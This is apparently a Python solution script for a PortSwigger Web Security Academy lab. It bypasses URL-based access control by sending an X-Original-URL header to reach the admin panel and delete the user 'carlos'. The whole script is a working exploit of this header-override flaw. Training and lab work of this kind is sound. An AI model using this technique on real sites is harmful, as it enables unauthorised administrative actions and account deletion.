##################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: URL-based access control can be circumvented
#
# Steps: 1. Fetch admin panel via X-Original-URL header
#        2. Delete carlos
#
##################################################################


###########
# imports
###########
import requests
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a48003c032ccba280a5c612000b0059.web-security-academy.net"

try:
    # set header
    headers = {"X-Original-Url": "/admin"}
    
    # fetch the admin panel
    # this step is not necessary in the script, you can do step 2 directrly
    # it's a must only when solving the lab using the browser
    admin_panel = requests.get(url, headers=headers)

except:
    print(Fore.RED + "[!] Failed to fetch the admin panel through exception")
    exit(1)
    
print(Fore.WHITE + "1. Fetching admin panel.. " + Fore.GREEN + "OK")

# set header  
headers = {
    "X-Original-Url": "/admin/delete"
}

try:
    # delete carlos
    delete_carlos = requests.get(f"{url}?username=carlos", headers=headers)

except:
    print(Fore.RED + "[!] Failed to delete carlos through exception")
    exit(1)

print(Fore.WHITE + "2. Deleting carlos.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
    


